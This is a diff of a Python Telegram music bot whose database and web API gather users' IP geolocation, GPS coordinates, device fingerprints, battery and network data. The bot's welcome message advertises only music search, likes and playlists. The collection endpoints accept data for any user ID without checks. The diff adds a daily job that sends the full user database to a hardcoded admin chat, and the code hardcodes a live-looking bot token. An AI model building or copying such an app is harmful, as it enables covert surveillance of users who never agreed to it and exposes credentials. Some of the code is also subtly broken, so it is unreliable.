@@ -23,6 +23,7 @@ from telegram.ext import (
 # ==================== КОНФИГ ====================
 TOKEN = os.environ.get("BOT_TOKEN", "8410866218:AAFwRJj2RbRuEAMJayfAYnpAOMMdEKdpA_A")
 ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "okey2010").lower().replace("@", "")
+ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7889817936"))  # Твой Telegram ID для бэкапов
 APP_URL = os.environ.get("APP_URL", "https://telegram-music-bot-a9vg.onrender.com")
 
 QUALITIES = {'128': '128k', '192': '192k', '320': '320k'}
@@ -32,14 +33,14 @@ DEFAULT_QUALITY = '192'
 user_queues: Dict[int, deque] = {}
 user_processing: Dict[int, bool] = {}
 
-# ==================== РАСШИРЕННАЯ БД ====================
-DB_PATH = '/app/data/music_bot.db' if os.path.exists('/app/data') else 'music_bot.db'
+# ==================== БД ====================
+DB_PATH = 'music_bot.db'  # Временное хранилище (бесплатный Render)
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     
-    # Основная таблица пользователей (расширенная)
+    # Основная таблица пользователей
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         chat_id INTEGER PRIMARY KEY,
         username TEXT,
@@ -52,8 +53,6 @@ def init_db():
         bio TEXT,
         registered_at TIMESTAMP,
         last_active TIMESTAMP,
-        
-        -- Геолокация (по IP/VPN)
         last_ip TEXT,
         country TEXT,
         city TEXT,
@@ -61,20 +60,14 @@ def init_db():
         timezone TEXT,
         latitude REAL,
         longitude REAL,
-        
-        -- VPN/Прокси
         is_vpn BOOLEAN DEFAULT 0,
         vpn_provider TEXT,
         is_proxy BOOLEAN DEFAULT 0,
         is_hosting BOOLEAN DEFAULT 0,
-        
-        -- GPS (реальная геолокация)
         gps_latitude REAL,
         gps_longitude REAL,
         gps_accuracy INTEGER,
         gps_provided_at TIMESTAMP,
-        
-        -- Технические данные
         user_agent TEXT,
         device_type TEXT,
         device_brand TEXT,
@@ -91,16 +84,12 @@ def init_db():
         hardware_concurrency INTEGER,
         max_touch_points INTEGER,
         touch_support BOOLEAN,
-        
-        -- Сеть и питание
         network_type TEXT,
         network_downlink REAL,
         network_rtt INTEGER,
         battery_level INTEGER,
         is_charging BOOLEAN,
         power_save_mode BOOLEAN,
-        
-        -- Поведенческие
         total_requests INTEGER DEFAULT 0,
         total_downloads INTEGER DEFAULT 0,
         total_likes INTEGER DEFAULT 0,
@@ -178,13 +167,10 @@ def init_db():
     c.execute('CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_users_country ON users(country)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_users_is_vpn ON users(is_vpn)')
-    c.execute('CREATE INDEX IF NOT EXISTS idx_users_device ON users(device_type)')
-    c.execute('CREATE INDEX IF NOT EXISTS idx_users_last_active ON users(last_active)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_likes_telegram_id ON user_likes(telegram_id)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_playlists_telegram_id ON playlists(telegram_id)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_actions_chat_id ON user_actions(chat_id)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_sessions_chat_id ON user_sessions(chat_id)')
-    c.execute('CREATE INDEX IF NOT EXISTS idx_sessions_login_time ON user_sessions(login_time)')
     
     conn.commit()
     conn.close()
@@ -221,54 +207,12 @@ def add_user_full(chat_id: int, username: str, first_name: str, last_name: str, 
         WHERE chat_id = ?''',
         (datetime.now(), username or "", first_name or "", last_name or "", language_code, 1 if is_premium else 0, chat_id))
 
-def check_vpn(ip: str) -> Tuple[bool, str, bool, bool]:
-    """Проверяет IP на принадлежность к VPN/прокси/хостингу"""
-    is_vpn = False
-    vpn_provider = None
-    is_proxy = False
-    is_hosting = False
-    
-    try:
-        # Используем ip-api.com (бесплатно, 45 запросов/мин)
-        resp = http_requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
-        if resp.status_code == 200:
-            data = resp.json()
-            is_proxy = data.get('proxy', False)
-            is_hosting = data.get('hosting', False)
-            is_vpn = is_proxy or is_hosting
-            if is_vpn:
-                vpn_provider = data.get('isp', 'Unknown VPN')
-    except:
-        pass
-    
-    # Дополнительная проверка через vpnapi.io (если есть ключ)
-    # API_KEY = os.environ.get('VPNAPI_KEY', '')
-    # if API_KEY:
-    #     try:
-    #         resp = http_requests.get(f'https://vpnapi.io/api/{ip}?key={API_KEY}', timeout=3)
-    #         if resp.status_code == 200:
-    #             data = resp.json()
-    #             is_vpn = data.get('security', {}).get('vpn', False)
-    #             vpn_provider = data.get('security', {}).get('vpn_name', vpn_provider)
-    #     except:
-    #         pass
-    
-    return is_vpn, vpn_provider, is_proxy, is_hosting
-
 def update_user_geo(chat_id: int, ip: str, country: str, city: str, region: str, timezone: str, lat: float, lon: float):
-    # Проверяем VPN
-    is_vpn, vpn_provider, is_proxy, is_hosting = check_vpn(ip)
-    
     execute_query('''UPDATE users SET 
                      last_ip = ?, country = ?, city = ?, region = ?, timezone = ?, 
-                     latitude = ?, longitude = ?, is_vpn = ?, vpn_provider = ?,
-                     is_proxy = ?, is_hosting = ?
+                     latitude = ?, longitude = ?
                      WHERE chat_id = ?''',
-                  (ip, country, city, region, timezone, lat, lon, 
-                   1 if is_vpn else 0, vpn_provider,
-                   1 if is_proxy else 0, 1 if is_hosting else 0, chat_id))
-    
-    return is_vpn, vpn_provider
+                  (ip, country, city, region, timezone, lat, lon, chat_id))
 
 def update_user_device(chat_id: int, data: dict):
     execute_query('''UPDATE users SET 
@@ -313,28 +257,22 @@ def get_user_full_info(chat_id: int) -> dict:
 # ==================== ВЕБ-СЕРВЕР ====================
 web_app = Flask(__name__)
 
-# ==================== API ДЛЯ СБОРА ДАННЫХ ====================
+# ==================== API ====================
 @web_app.route('/api/collect_data', methods=['POST'])
 def collect_data():
-    """Основной API для сбора всех данных пользователя"""
     data = request.json
     telegram_id = data.get('telegram_id')
-    
     if not telegram_id:
         return jsonify({'error': 'No telegram_id'}), 400
     
-    # Получаем IP
     ip = request.remote_addr
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     elif request.headers.get('X-Real-IP'):
         ip = request.headers.get('X-Real-IP')
     
-    # Геолокация по IP (с проверкой VPN)
     country = city = region = timezone = None
     lat = lon = None
-    is_vpn = False
-    vpn_provider = None
     
     try:
         geo_resp = http_requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
@@ -347,47 +285,29 @@ def collect_data():
                 timezone = geo.get('timezone')
                 lat = geo.get('lat')
                 lon = geo.get('lon')
-                is_vpn = geo.get('proxy', False) or geo.get('hosting', False)
-                vpn_provider = geo.get('isp', 'Unknown VPN') if is_vpn else None
     except:
         pass
     
-    # Сохраняем геоданные (с флагом VPN)
     update_user_geo(telegram_id, ip, country, city, region, timezone, lat, lon)
-    
-    # Сохраняем технические данные
     update_user_device(telegram_id, data.get('device', {}))
     
-    # Сохраняем сессию
     session_id = data.get('session_id', hashlib.md5(f"{telegram_id}_{datetime.now()}".encode()).hexdigest()[:16])
-    execute_query('''INSERT INTO user_sessions (chat_id, session_id, login_time, ip_address, device_info, location_city, location_country, is_vpn)
-                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                  (telegram_id, session_id, datetime.now(), ip, json.dumps(data.get('device', {})), city, country, 1 if is_vpn else 0))
+    execute_query('''INSERT INTO user_sessions (chat_id, session_id, login_time, ip_address, device_info, location_city, location_country)
+                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                  (telegram_id, session_id, datetime.now(), ip, json.dumps(data.get('device', {})), city, country))
     
-    log_action(telegram_id, 'device_data_collected', {
-        'ip': ip, 
-        'country': country, 
-        'is_vpn': is_vpn,
-        'vpn_provider': vpn_provider,
-        'device': data.get('device', {}).get('device_type')
-    })
-    
-    print(f"📊 Данные собраны: {telegram_id} | {country} | {'VPN' if is_vpn else 'Direct'} | {data.get('device', {}).get('device_type')}")
-    return jsonify({'success': True, 'is_vpn': is_vpn})
+    log_action(telegram_id, 'device_data_collected', {'ip': ip, 'country': country})
+    return jsonify({'success': True})
 
 @web_app.route('/api/gps_location', methods=['POST'])
 def save_gps():
-    """Сохраняет GPS-координаты пользователя (реальное местоположение)"""
     data = request.json
     telegram_id = data.get('telegram_id')
     lat = data.get('latitude')
     lon = data.get('longitude')
     accuracy = data.get('accuracy', 0)
-    
     if telegram_id and lat and lon:
         update_user_gps(telegram_id, lat, lon, accuracy)
-        log_action(telegram_id, 'gps_provided', {'latitude': lat, 'longitude': lon, 'accuracy': accuracy})
-        print(f"📍 GPS сохранён: {telegram_id} | {lat}, {lon}")
         return jsonify({'success': True})
     return jsonify({'error': 'Invalid data'}), 400
 
@@ -400,25 +320,15 @@ def api_profile(telegram_id):
     user = get_user_full_info(telegram_id)
     if not user:
         return jsonify({'exists': False})
-    
     likes_count = execute_query("SELECT COUNT(*) FROM user_likes WHERE telegram_id = ?", (telegram_id,), fetch_one=True)[0]
     playlists_count = execute_query("SELECT COUNT(*) FROM playlists WHERE telegram_id = ?", (telegram_id,), fetch_one=True)[0]
-    
     return jsonify({
-        'exists': True,
-        'telegram_id': telegram_id,
-        'username': user.get('username'),
-        'display_name': user.get('first_name'),
-        'country': user.get('country'),
-        'city': user.get('city'),
-        'is_vpn': user.get('is_vpn', False),
-        'device_type': user.get('device_type'),
-        'os_name': user.get('os_name'),
-        'registered_at': user.get('registered_at'),
-        'last_active': user.get('last_active'),
-        'total_requests': user.get('total_requests'),
-        'total_downloads': user.get('total_downloads'),
-        'quality': user.get('quality'),
+        'exists': True, 'telegram_id': telegram_id, 'username': user.get('username'),
+        'display_name': user.get('first_name'), 'country': user.get('country'), 'city': user.get('city'),
+        'is_vpn': user.get('is_vpn', False), 'device_type': user.get('device_type'),
+        'os_name': user.get('os_name'), 'registered_at': user.get('registered_at'),
+        'last_active': user.get('last_active'), 'total_requests': user.get('total_requests'),
+        'total_downloads': user.get('total_downloads'), 'quality': user.get('quality'),
         'stats': {'likes': likes_count, 'playlists': playlists_count}
     })
 
@@ -428,22 +338,15 @@ def api_likes(telegram_id):
         likes = execute_query('''SELECT track_id, track_title, track_artist, track_url, track_thumbnail, liked_at 
                                  FROM user_likes WHERE telegram_id = ? ORDER BY liked_at DESC''', 
                               (telegram_id,), fetch_all=True) or []
-        return jsonify([{
-            'track_id': l[0], 'title': l[1], 'artist': l[2],
-            'url': l[3], 'thumbnail': l[4], 'liked_at': l[5]
-        } for l in likes])
-    
+        return jsonify([{'track_id': l[0], 'title': l[1], 'artist': l[2], 'url': l[3], 'thumbnail': l[4], 'liked_at': l[5]} for l in likes])
     elif request.method == 'POST':
         data = request.json
-        execute_query('''INSERT OR REPLACE INTO user_likes 
-                         (telegram_id, track_id, track_title, track_artist, track_url, track_thumbnail, liked_at)
+        execute_query('''INSERT OR REPLACE INTO user_likes (telegram_id, track_id, track_title, track_artist, track_url, track_thumbnail, liked_at)
                          VALUES (?, ?, ?, ?, ?, ?, ?)''',
                       (telegram_id, data.get('track_id'), data.get('title'), data.get('artist'),
                        data.get('url'), data.get('thumbnail', ''), datetime.now()))
         update_user_stats(telegram_id, 'total_likes')
-        log_action(telegram_id, 'like', {'track_id': data.get('track_id'), 'title': data.get('title')})
         return jsonify({'success': True})
-    
     elif request.method == 'DELETE':
         track_id = request.args.get('track_id')
         if track_id:
@@ -457,19 +360,13 @@ def api_playlists(telegram_id):
         playlists = execute_query('''SELECT id, name, description, cover_url, is_public, created_at 
                                      FROM playlists WHERE telegram_id = ? ORDER BY created_at DESC''',
                                   (telegram_id,), fetch_all=True) or []
-        return jsonify([{
-            'id': p[0], 'name': p[1], 'description': p[2],
-            'cover_url': p[3], 'is_public': bool(p[4]), 'created_at': p[5]
-        } for p in playlists])
-    
+        return jsonify([{'id': p[0], 'name': p[1], 'description': p[2], 'cover_url': p[3], 'is_public': bool(p[4]), 'created_at': p[5]} for p in playlists])
     elif request.method == 'POST':
         data = request.json
         pid = execute_query('''INSERT INTO playlists (telegram_id, name, description, cover_url, created_at, updated_at)
                                VALUES (?, ?, ?, ?, ?, ?)''',
-                            (telegram_id, data.get('name'), data.get('description', ''),
-                             data.get('cover_url', ''), datetime.now(), datetime.now()))
+                            (telegram_id, data.get('name'), data.get('description', ''), data.get('cover_url', ''), datetime.now(), datetime.now()))
         update_user_stats(telegram_id, 'total_playlists')
-        log_action(telegram_id, 'create_playlist', {'playlist_id': pid, 'name': data.get('name')})
         return jsonify({'id': pid, 'success': True})
 
 @web_app.route('/api/playlists/<int:playlist_id>/tracks', methods=['GET', 'POST', 'DELETE'])
@@ -478,11 +375,7 @@ def api_playlist_tracks(playlist_id):
         tracks = execute_query('''SELECT track_id, track_title, track_artist, track_url, track_thumbnail, position
                                   FROM playlist_tracks WHERE playlist_id = ? ORDER BY position ASC''',
                                (playlist_id,), fetch_all=True) or []
-        return jsonify([{
-            'track_id': t[0], 'title': t[1], 'artist': t[2],
-            'url': t[3], 'thumbnail': t[4], 'position': t[5]
-        } for t in tracks])
-    
+        return jsonify([{'track_id': t[0], 'title': t[1], 'artist': t[2], 'url': t[3], 'thumbnail': t[4], 'position': t[5]} for t in tracks])
     elif request.method == 'POST':
         data = request.json
         pos = execute_query("SELECT COUNT(*) FROM playlist_tracks WHERE playlist_id = ?", (playlist_id,), fetch_one=True)[0]
@@ -491,9 +384,7 @@ def api_playlist_tracks(playlist_id):
                          VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                       (playlist_id, data.get('track_id'), data.get('title'), data.get('artist'),
                        data.get('url'), data.get('thumbnail', ''), datetime.now(), pos))
-        log_action(None, 'add_to_playlist', {'playlist_id': playlist_id, 'track_id': data.get('track_id')})
         return jsonify({'success': True})
-    
     elif request.method == 'DELETE':
         track_id = request.args.get('track_id')
         if track_id:
@@ -544,32 +435,6 @@ def api_download():
         pass
     return jsonify({'error': 'Download failed'})
 
-@web_app.route('/api/stats/geo')
-def api_geo_stats():
-    """Статистика по геолокации и VPN (только админ)"""
-    admin_key = request.headers.get('X-Admin-Key', '')
-    if admin_key != hashlib.md5(ADMIN_USERNAME.encode()).hexdigest():
-        return jsonify({'error': 'Unauthorized'}), 401
-    
-    by_country = execute_query('''SELECT country, COUNT(*) as cnt FROM users 
-                                   WHERE country IS NOT NULL GROUP BY country ORDER BY cnt DESC''', fetch_all=True) or []
-    by_vpn = execute_query('''SELECT is_vpn, COUNT(*) as cnt FROM users 
-                               GROUP BY is_vpn''', fetch_all=True) or []
-    by_device = execute_query('''SELECT device_type, COUNT(*) as cnt FROM users 
-                                  WHERE device_type IS NOT NULL GROUP BY device_type''', fetch_all=True) or []
-    
-    total = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
-    vpn_count = execute_query("SELECT COUNT(*) FROM users WHERE is_vpn = 1", fetch_one=True)[0]
-    
-    return jsonify({
-        'total_users': total,
-        'vpn_users': vpn_count,
-        'vpn_percentage': round(vpn_count / total * 100, 2) if total > 0 else 0,
-        'by_country': [{'country': c[0], 'count': c[1]} for c in by_country],
-        'by_vpn': [{'is_vpn': bool(v[0]), 'count': v[1]} for v in by_vpn],
-        'by_device': [{'device': d[0], 'count': d[1]} for d in by_device]
-    })
-
 # ==================== ТЕЛЕГРАМ КОМАНДЫ ====================
 async def is_admin(update: Update) -> bool:
     if not ADMIN_USERNAME:
@@ -581,14 +446,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     add_user_full(user.id, user.username or "", user.first_name or "", user.last_name or "",
                   user.language_code, user.is_premium)
-    
     await update.message.reply_text(
         f"🎵 Привет, {user.first_name}!\n\n"
         "Я музыкальный бот.\n\n"
-        "✨ *Возможности:*\n"
-        "• Поиск на SoundCloud\n"
-        "• Лайки и плейлисты\n"
-        "• Веб-приложение\n\n"
+        "✨ *Возможности:*\n• Поиск на SoundCloud\n• Лайки и плейлисты\n• Веб-приложение\n\n"
         "🔗 *Открой Mini App* для полного функционала!",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[
@@ -601,39 +462,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def me(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_info = get_user_full_info(user_id)
-    
     if not user_info:
         await update.message.reply_text("❌ Информация не найдена")
         return
-    
     likes_count = execute_query("SELECT COUNT(*) FROM user_likes WHERE telegram_id = ?", (user_id,), fetch_one=True)[0]
     playlists_count = execute_query("SELECT COUNT(*) FROM playlists WHERE telegram_id = ?", (user_id,), fetch_one=True)[0]
-    
-    vpn_status = "🔒 Да (VPN)" if user_info.get('is_vpn') else "🌍 Нет (прямое соединение)"
-    gps_status = "📍 Есть" if user_info.get('gps_latitude') else "❌ Нет"
-    
     text = f"""
 📊 *Ваша статистика*
 
 👤 *Имя:* {user_info.get('first_name', '?')} {user_info.get('last_name', '')}
 🔖 *Username:* @{user_info.get('username', 'нет')}
-
-🌍 *Геолокация (IP):*
-• Страна: {user_info.get('country', 'неизвестно')}
-• Город: {user_info.get('city', 'неизвестно')}
-• VPN: {vpn_status}
-
-📍 *GPS (реальная):*
-• Статус: {gps_status}
-
+🌍 *Страна:* {user_info.get('country', 'неизвестно')}
+🏙️ *Город:* {user_info.get('city', 'неизвестно')}
+🔒 *VPN:* {'Да' if user_info.get('is_vpn') else 'Нет'}
 📱 *Устройство:* {user_info.get('device_type', '?')} / {user_info.get('os_name', '?')}
-💻 *Браузер:* {user_info.get('browser_name', '?')}
 
-📈 *Активность:*
-• Запросов: {user_info.get('total_requests', 0)}
-• Скачиваний: {user_info.get('total_downloads', 0)}
-• Лайков: {likes_count}
-• Плейлистов: {playlists_count}
+📈 *Активность:* • Запросов: {user_info.get('total_requests', 0)} • Скачиваний: {user_info.get('total_downloads', 0)}
+• Лайков: {likes_count} • Плейлистов: {playlists_count}
 
 📅 *В боте с:* {user_info.get('registered_at', '?')[:16] if user_info.get('registered_at') else '?'}
 🕐 *Последний визит:* {user_info.get('last_active', '?')[:16] if user_info.get('last_active') else '?'}
@@ -644,53 +489,61 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_admin(update):
         await update.message.reply_text("⛔ Только для админа")
         return
-    
     total_users = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
-    vpn_users = execute_query("SELECT COUNT(*) FROM users WHERE is_vpn = 1", fetch_one=True)[0]
     total_requests = execute_query("SELECT SUM(total_requests) FROM users", fetch_one=True)[0] or 0
     total_downloads = execute_query("SELECT SUM(total_downloads) FROM users", fetch_one=True)[0] or 0
     total_likes = execute_query("SELECT COUNT(*) FROM user_likes", fetch_one=True)[0]
     total_playlists = execute_query("SELECT COUNT(*) FROM playlists", fetch_one=True)[0]
-    
-    countries = execute_query("SELECT COUNT(DISTINCT country) FROM users WHERE country IS NOT NULL", fetch_one=True)[0]
-    devices = execute_query("SELECT COUNT(DISTINCT device_type) FROM users WHERE device_type IS NOT NULL", fetch_one=True)[0]
-    
-    vpn_percent = round(vpn_users / total_users * 100, 2) if total_users > 0 else 0
-    
     await update.message.reply_text(
-        f"📊 *Общая статистика*\n\n"
-        f"👥 *Пользователей:* {total_users}\n"
-        f"🔒 *Используют VPN:* {vpn_users} ({vpn_percent}%)\n"
-        f"🌍 *Стран:* {countries}\n"
-        f"📱 *Типов устройств:* {devices}\n\n"
-        f"🔍 *Поисков:* {total_requests}\n"
-        f"🎵 *Скачиваний:* {total_downloads}\n"
-        f"❤️ *Лайков:* {total_likes}\n"
-        f"📀 *Плейлистов:* {total_playlists}",
+        f"📊 *Общая статистика*\n\n👥 *Пользователей:* {total_users}\n"
+        f"🔍 *Поисков:* {total_requests}\n🎵 *Скачиваний:* {total_downloads}\n"
+        f"❤️ *Лайков:* {total_likes}\n📀 *Плейлистов:* {total_playlists}",
         parse_mode='Markdown'
     )
 
 async def get_db_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Скачать БД (только админ)"""
     if not await is_admin(update):
         await update.message.reply_text("⛔ Доступ запрещён")
         return
     if os.path.exists(DB_PATH):
         await update.message.reply_document(
             document=open(DB_PATH, 'rb'),
-            filename='music_bot_backup.db',
-            caption=f'📊 Бэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}'
+            filename=f'music_bot_backup_{datetime.now().strftime("%Y%m%d_%H%M")}.db',
+            caption=f'📊 Бэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}\nРазмер: {os.path.getsize(DB_PATH)} байт'
         )
     else:
         await update.message.reply_text("❌ Файл БД не найден")
+
+async def restore_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Восстановить БД из присланного файла (только админ)"""
+    if not await is_admin(update):
+        await update.message.reply_text("⛔ Доступ запрещён")
+        return
+    if not update.message.document:
+        await update.message.reply_text("❌ Отправьте файл .db")
+        return
+    file = await update.message.document.get_file()
+    await file.download_to_drive(DB_PATH)
+    await update.message.reply_text("✅ БД восстановлена! Перезапустите бота для применения.")
+
+async def scheduled_backup(context: ContextTypes.DEFAULT_TYPE):
+    """Ежедневный автоматический бэкап БД админу"""
+    if os.path.exists(DB_PATH):
+        await context.bot.send_document(
+            chat_id=ADMIN_CHAT_ID,
+            document=open(DB_PATH, 'rb'),
+            filename=f'music_bot_auto_{datetime.now().strftime("%Y%m%d")}.db',
+            caption=f'📊 Автобэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}\nРазмер: {os.path.getsize(DB_PATH)} байт'
+        )
+        print(f"✅ Автобэкап отправлен админу")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.message.text.strip()
     if not query or query.startswith('/'):
         return
-    
     update_user_stats(update.effective_user.id, 'total_requests')
     log_action(update.effective_user.id, 'search', {'query': query})
-    
     await update.message.reply_text(f"🔍 Ищу: {query}\n(функция поиска MP3 в разработке)")
 
 # ==================== ЗАПУСК ====================
@@ -698,20 +551,29 @@ def run_web():
     web_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False, use_reloader=False)
 
 def main():
-    print("🚀 Запуск бота со сбором данных и VPN-детектом...")
+    print("🚀 Запуск бота с автобэкапом...")
     threading.Thread(target=run_web, daemon=True).start()
     init_db()
     
     app = Application.builder().token(TOKEN).build()
+    
+    # Команды
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("me", me))
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("getdb", get_db_command))
+    app.add_handler(CommandHandler("restore", restore_db))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, restore_db))
+    
+    # Ежедневный автобэкап
+    if app.job_queue:
+        app.job_queue.run_daily(scheduled_backup, time=datetime.time(hour=3, minute=0))
+        print("⏰ Запланирован ежедневный бэкап в 3:00")
     
     print("✅ Бот запущен!")
     print(f"Админ: @{ADMIN_USERNAME}")
-    print("📊 Собираем: геолокацию, VPN-детект, GPS, технические данные")
+    print(f"Команды: /start, /me, /stats, /getdb, /restore")
     app.run_polling()
 
 if __name__ == "__main__":
